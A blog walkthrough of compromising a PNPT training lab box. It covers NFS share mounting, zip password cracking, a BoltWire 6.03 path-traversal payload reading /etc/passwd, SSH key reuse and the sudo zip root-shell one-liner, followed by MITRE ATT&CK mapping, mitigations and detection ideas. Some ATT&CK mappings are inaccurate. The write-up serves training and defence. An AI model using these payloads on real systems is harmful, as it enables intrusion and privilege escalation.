---
layout: single
classes: wide
author_profile: true
categories: 
  - Blog
tags: 
  - PNPT
  - MITRE ATT&CK
  - Privilege Escalation
  - Web Exploits
  - Exploitation
  - Cybersecurity
  - Linux 
title: "Compromising the Dev Box: A PNPT Walkthrough with Mitigation and MITRE ATT&CK Mapping"
date: 2024-12-07
tags: [PNPT, TCM Security, Dev Box, MITRE ATT&CK, exploitation, mitigation]
excerpt: "A step-by-step walkthrough of compromising the Dev Box from TCM Security’s PNPT training course, including detailed explanations, mitigation steps, and a comprehensive mapping to MITRE ATT&CK tactics and techniques."
toc: true
toc_sticky: true
toc_label: "Walkthrough Outline"
tagline:  "A step-by-step walkthrough of compromising the Dev Box from TCM Security’s PNPT training course, including detailed explanations, mitigation steps, and a comprehensive mapping to MITRE ATT&CK tactics and techniques."
header:
  image: /assets/images/tcm-security/dev-00.png
  caption: "Dev"
  teaser: /assets/images/tcm-security/dev-00.png
  overlay_filter: rgba(0, 0, 0, 0.5)
  overlay_image: /assets/images/tcm-security/dev-00.png
  caption: "Photo credit: [**AI**](https://chatgpt.com/)""
---

## Introduction

In this article, I walk through my successful compromise of the Dev Box from TCM Security’s PNPT training course. The process spans reconnaissance, exploitation, and privilege escalation. I’ll also detail relevant mitigation strategies and map the techniques used to the MITRE ATT&CK framework to enhance threat defense practices.


## Table of Contents

- [Introduction](#introduction)
- [Reconnaissance and Initial Enumeration](#reconnaissance-and-initial-enumeration)
- [Exploitation and Privilege Escalation](#exploitation-and-privilege-escalation)
- [MITRE ATT&CK Framework Mitigations](#mitre-attck-framework-mitigations)
- [Mitigation and Remediation Steps](#mitigation-and-remediation-steps)
- [Detection Opportunities and ATT&CK Matrix](#detection-opportunities-and-attck-matrix)
- [Conclusion and Final Thoughts](#conclusion-and-final-thoughts)

## Reconnaissance and Initial Enumeration

I began by conducting a full TCP port and service version scan using Nmap:

```bash
nmap -p- -A -T4 10.0.100.12
```
<img src="/assets/images/tcm-academy/dev-02.png">

The following ports were discovered open:

- **22** (SSH)  
- **80** (HTTP)  
- **111** (RPC)  
- **2049** (NFS)  
- **8080** (HTTP-alt)  
- **32771**, **33727**, **36393**, **40821** (RPC-related ports)

Visiting the web service on port **80** in the browser revealed a default Apache web page referencing **Bolt CMS**.

<img src="/assets/images/tcm-academy/dev-03.png">

This Bolt - Installation Error page is a default message that appears when Bolt CMS is installed in the wrong web directory. Instead of pointing to /var/www/html/public/, the web server is configured to serve from /var/www/html/. This misconfiguration inadvertently exposes internal application files and setup instructions.

**Why This Matters**

- **Information Disclosure:** Confirms Bolt CMS use and reveals internal paths.

- **Fingerprinting Opportunity:** Opens the door to version-specific exploits.

- **Misconfigured Web Root:** Risks exposing files that should remain private.


Port **8080** displayed a PHP information disclosure page, exposing server-level details including Apache and PHP versions, modules, and configuration paths.


<img src="/assets/images/tcm-academy/dev-04.png">


While continuing to investigate, I launched directory brute-force scans on both ports using FFUF:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.0.100.12/FUZZ
```

<img src="/assets/images/tcm-academy/dev-80.png">


```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.0.100.12:8080/FUZZ
```

<img src="/assets/images/tcm-academy/dev-8080.png">


With scans in progress, I turned to explore services revealed by Nmap.

**NFS Enumeration and Credential Discovery**

Port **2049** revealed a running NFS service. Using showmount, I queried the exported directories:

```bash
showmount -e 10.0.100.12
```

<img src="/assets/images/tcm-academy/dev-13.png">


The output indicated that /srv/nfs was being shared and was accessible to the entire `10.0.0.0/8`, `172.16.0.0/12`, and `192.168.0.0/16` network ranges. This represents a dangerous misconfiguration.

🔓 Why is this important?

- Mountable shares may contain clear-text credentials or sensitive project files.

- Weak NFS configurations (e.g., missing root squashing) can be abused for privilege escalation or lateral movement.


I mounted the NFS share locally to inspect its contents:


```bash
mkdir /mnt/dev
mount -t nfs 10.0.100.12:/srv/nfs /mnt/dev
cd /mnt/dev
```

<img src="/assets/images/tcm-academy/dev-14.png">


Once inside the mounted directory, I discovered a suspicious file named `save.zip`:

<img src="/assets/images/tcm-academy/dev-15.png">

Attempting to unzip it revealed that the archive was password protected :

<img src="/assets/images/tcm-academy/dev-16.png">

Since the password wasn’t known, I used `fcrackzip` and the popular `rockyou.txt` wordlist to brute-force it:

```bash
sudo fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
```


The password was successfully found: java101.

<img src="/assets/images/tcm-academy/dev-17.png">

I extracted the archive using the recovered password, which revealed two artifacts: 
- `id_rsa` - a private SSH key
- `todo.txt` - a plaintext file with developer notes

<img src="/assets/images/tcm-academy/dev-18.png">


I inspected the todo.txt file for clues:


```bash
cat todo.txt
```

<img src="/assets/images/tcm-academy/dev-19.png">

These notes provided valuable intel:

- The user (presumably with initials jp) is a developer on this box.

- The reference to Java correlates with the cracked password java101, which may be reused elsewhere.

- The presence of a private SSH key and the jp initials hinted at an SSH login opportunity.


Next, I attempted to connect over SSH using the private key and the username jp:

```bash
ssh -I id_rsa jp@10.0.100.12
```

<img src="/assets/images/tcm-academy/dev-20.png">

However, this prompted for a passphrase for the key, indicating additional protection was in play.


**Directory Busting Results and Discovery**

At this point I decided to continue on with my post-scan analysis, revisiting the results of the FFUF directory brute-force scans.


**Port 80 Directory Results**

Several directories responded with **301 Moved Permanently** HTTP status codes, indicating redirection. These included:

- `/public`

- `/src`

- `/app`

- `/vendor`

- `/extensions`

This suggested the presence of potentially accessible internal application folders that may contain sensitive files or configuration data.


<img src="/assets/images/tcm-academy/dev-09.png">  


**Port 8080 Directory Results**

On port **8080**, the FFUF scan revealed a /dev directory that responded with a **301 redirect** and a **200 OK**, indicating successful content retrieval. This was especially interesting in the context of the earlier discovery in `todo.txt`, where the user “jp” mentioned working on a development website and their love for Java.

This clue aligned perfectly with the `/dev` path and prompted me to investigate further.


<img src="/assets/images/tcm-academy/dev-11.png"> 



**Discovering BoltWire CMS on Port 8080**

From the results of my FFUF scan on port **8080**, the `/dev` directory really stood out. Based on earlier hints in the `todo.txt` file referencing a development website and the user's interest in Java, this directory warranted further exploration.

I visited the `/dev` endpoint in the browser:

```bash
http://10.0.100.12:8080/dev/
```

<img src="/assets/images/tcm-academy/dev-21.png">

To my surprise, this led to a BoltWire CMS setup page confirming the application had been successfully deployed.

This page indicated that the CMS instance was live and functional—an excellent opportunity to enumerate further and possibly find a way to exploit the system.

**Exploring Web-Exposed Directories**

I explored several of the directories discovered during the directory brute-force scan on port 80:

<img src="/assets/images/tcm-academy/dev-22.png">  <img src="/assets/images/tcm-academy/dev-23.png">

<img src="/assets/images/tcm-academy/dev-24.png">   <img src="/assets/images/tcm-academy/dev-25.png">


Initially, most of these appeared uninteresting or led to generic index listings. But when I navigated to the `/app/config/` directory, I found a goldmine of potential configuration files:

<img src="/assets/images/tcm-academy/dev-26.png">


Opening the config.yml file revealed hardcoded database credentials:

<img src="/assets/images/tcm-academy/dev-27.png">

This included a username of bolt and a password of I_love_java, which immediately stood out based on previous hints and findings (like the Java-related comment in the todo.txt file). At this point, I made note to try these credentials later in the enumeration and exploitation stages.



**Identifying BoltWire Version and Planning Exploitation**

After logging into the BoltWire CMS running on port `8080` BoltWire CMS running on port 8080, I explored various available actions. Although I was able to register and log in successfully, no direct administrative functionality was accessible from the dashboard.

However, clicking the `print` action in the navigation bar triggered an information disclosure that revealed the exact CMS version in use:


<img src="/assets/images/tcm-academy/dev-31-1.png">


Version Disclosure: The message revealed that the site was running BoltWire version 6.03.

This was a pivotal moment. With the exact version known, I pivoted to researching known exploits for BoltWire 6.03. 


A quick search on Google and Exploit-DB surfaced a known Local File Inclusion (LFI) vulnerability associated with this version. This exploit would allow me to access sensitive system files if successfully executed.

<img src="/assets/images/tcm-academy/dev-32.png">

<img src="/assets/images/tcm-academy/dev-33.png">

<a href="https://www.exploit-db.com/exploits/48411" target="_blank">https://www.exploit-db.com/exploits/48411 </a>

<img src="/assets/images/tcm-academy/dev-34.png">



## Choosing the Exploitation Path

After reviewing the available options, I determined that the **Local File Inclusion (LFI)** exploit was the most appropriate path forward for the following reasons:

✅ It directly matched the confirmed **BoltWire CMS version (6.03)**.

✅ It required only an **authenticated user**—a condition I had already met by registering on the site.

✅ It leveraged the application's predictable **URL routing pattern**, allowing for payload injection.

✅ It offered a direct path to sensitive file disclosure and opened the door to further privilege escalation opportunities.

Armed with this information, I proceeded to test the vulnerability.



**Performing Local File Inclusion**

The exploit format from ExploitDB ID 48411 requires a GET request to:

```bash
/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
```

Because I was already authenticated from registering and logging in earlier, I could perform the attack by navigating directly to the LFI path in the browser:

```bash
http://10.0.100.12:8080/dev/index.php?p=action.search&action=../../../../../../../../etc/passwd
```

This successfully disclosed the contents of the `/etc/passwd` file.


<img src="/assets/images/tcm-academy/dev-35.png">  



**Identifying Valid User Accounts**

Scrolling through the output, I came across a user named jeanpaul. This stood out because it aligned with the initials jp from the previously recovered todo.txt file found inside the NFS share.

This was a strong lead — it suggested a valid system user, potentially with a home directory and SSH access.

<img src="/assets/images/tcm-academy/dev-37.png">


**Gaining SSH Access as JeanPaul**

Now that I had a valid username (jeanpaul) and a private key (id_rsa) recovered from the mounted NFS share, I attempted to SSH into the target system using the following command:

```bash
sudo ssh -I id_rsa jeanpaul@10.0.100.12
```

The system prompted me for the key passphrase. At this point, I reflected on artifacts previously recovered:

- The `todo.txt` file contained a note that said: “Keep coding in Java because it’s awesome.”

- The `config.yml` exposed a password value: `i_love_java`

Taking a calculated guess, I tried the password `i_love_java` as the key passphrase—and it worked! I successfully authenticated and gained shell access to the system as user `jeanpaul`.

<img src="/assets/images/tcm-academy/dev-38.png">


With access to jeanpaul, it was time to explore how I could elevate to root.

## Post-Exploitation: Local Enumeration and Privilege Escalation Path

After gaining shell access as user `jeanpaul`, I immediately ran standard enumeration commands to understand the system context and check for privilege escalation vectors.

```bash
ls
pwd
history
sudo -l
```

<img src="/assets/images/tcm-academy/dev-39.png"> 

From the output of `sudo -l`, I discovered that `jeanpaul` had `NOPASSWD` permissions to run `/usr/bin/zip` as root—without requiring a password. This is a huge find, as it can be abused for privilege escalation!

<img src="/assets/images/tcm-academy/dev-40.png"> 

This revealed that the zip binary could be run with root privileges. To investigate potential abuses, I consulted <a href="https://gtfobins.github.io/gtfobins/zip/#sudo" target="_blank">GTFOBins</a>, which confirmed that `zip` is a known escalation vector if misconfigured this way.

**GTFOBins Guidance**

If the zip binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to escalate or maintain privileged access.

<img src="/assets/images/tcm-academy/dev-42.png"> 

<img src="/assets/images/tcm-academy/dev-43.png"> 

<img src="/assets/images/tcm-academy/dev-44.png"> 



## Executing the Exploit

Using the GTFOBins-provided payload, I created a temporary file, invoked zip with the -T and -TT flags, and injected a shell:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

### Root Access Achieved

The command successfully spawned a shell as root. I confirmed root-level access with:

```bash
id
cd /root
cat flag.txt
```

<img src="/assets/images/tcm-academy/dev-44.png">

And there it was—the flag:

**Congratz on rooting this box!**

# Detection Opportunities and ATT&CK Matrix

### MITRE ATT&CK Framework Mapping and Mitigation Strategies


To strengthen the defensive posture of environments against similar exploitation paths, it's crucial to align the observed attacker techniques with the MITRE ATT&CK framework. This provides defenders with visibility into how adversaries operate, and what countermeasures can be implemented to reduce risk.


| Technique | Description | Tactic |
|----------|-------------|--------|
| [T1135 - Network Share Discovery](https://attack.mitre.org/techniques/T1135/) | The attacker discovered open NFS shares via `showmount -e`. | Discovery |
| [T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/) | Credentials were harvested from NFS-mounted directories, including SSH private keys. | Credential Access |
| [T1059.004 - Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/) | The attacker used Bash to interact with the system and chain privilege escalation. | Execution |
| [T1003 - Credential Dumping](https://attack.mitre.org/techniques/T1003/) | The attacker extracted SSH private keys and cracked ZIP file passwords with `fcrackzip`. | Credential Access |
| [T1552.001 - Unsecured Credentials: Credentials in Files](https://attack.mitre.org/techniques/T1552/001/) | Bolt CMS configuration files exposed database credentials in plaintext. | Credential Access |
| [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) | LFI vulnerability in BoltWire CMS was exploited to leak sensitive files. | Initial Access |
| [T1068 - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/) | GTFOBins technique via `zip` used for local privilege escalation. | Privilege Escalation |
| [T1078 - Valid Accounts](https://attack.mitre.org/techniques/T1078/) | SSH login was performed using cracked private key and password. | Persistence |

### Mitigation Strategies

| Mitigation | Description |
|------------|-------------|
| **M1021 - Restrict Web-Based Content** | Disable directory indexing on web servers to prevent file listing and direct file access. |
| **M1040 - Behavior Prevention** | Monitor and alert on suspicious usage of binaries like `zip`, especially when used via `sudo`. |
| **M1022 - Restrict File and Directory Permissions** | Enforce least privilege for file access. NFS shares should be restricted and root squash enabled. |
| **M1012 - Vulnerability Scanning** | Regular vulnerability assessments could have identified the misconfigured Bolt CMS installation. |
| **M1042 - Disable or Remove Feature or Program** | Avoid enabling unnecessary binaries (e.g., `zip` as sudo) unless absolutely required. |
| **M1047 - Audit** | Log and monitor usage of sensitive paths like `/etc/`, access to SSH keys, and execution of privilege escalation binaries. |


### Detection Opportunities

These are specific areas where defenders could have detected malicious activity during the compromise of the Dev Box. Mapping them to log sources and behaviors helps defenders create alerts, dashboards, and hunt queries.

| Log Source / Control Point       | Detection Focus                                                                 |
|----------------------------------|----------------------------------------------------------------------------------|
| **Web Server Logs**              | Detect URL path traversal attempts (e.g., `../../etc/passwd`) via `access.log`. |
| **Authentication Logs**          | Monitor for SSH login using `id_rsa`, especially from unknown IPs or for new users. |
| **File Access Logs (auditd)**    | Track reads to sensitive files like `id_rsa`, `config.yml`, or `/etc/passwd`.   |
| **Sudo Command Logs**            | Alert on unusual `sudo` usage involving `zip` with `-T` and `-TT` flags.         |
| **NFS Server Logs**              | Detect remote mounts to development shares from unauthorized IPs.               |
| **BoltWire Application Logs**    | Look for new account registrations or access to the `action` parameter.         |
| **Network Monitoring (IDS/IPS)** | Flag outbound requests containing traversal strings or repeated LFI attempts.   |


## Final Thoughts

This walkthrough of the Dev Box from TCM Security’s PNPT training course demonstrates how layered misconfigurations—when chained together—can lead to a full system compromise. From open NFS shares and exposed credentials, to LFI vulnerabilities and weak privilege escalation controls, each weakness contributed to the overall attack path.

Along the way, we:

- Performed full port scanning and service enumeration

- Exploited a misconfigured NFS share to recover sensitive credentials

- Leveraged LFI in BoltWire CMS to enumerate system users

- Authenticated via SSH using a cracked private key

- Escalated privileges to root using a GTFOBins zip sudo misconfiguration

### 🔑 Key Takeaways:

- Always sanitize and secure public-facing services—even development tools.

- Avoid storing credentials and SSH keys in accessible locations like NFS shares.

- Regular audits of sudoers configurations can prevent privilege escalation.

- Use the MITRE ATT&CK framework to understand and defend against attacker behaviors.

By analyzing how attackers move laterally and escalate privileges, defenders can better anticipate and respond to real-world threats.

Thanks for reading!

🛡️ Stay curious, stay secure.
— Notes by Nisha



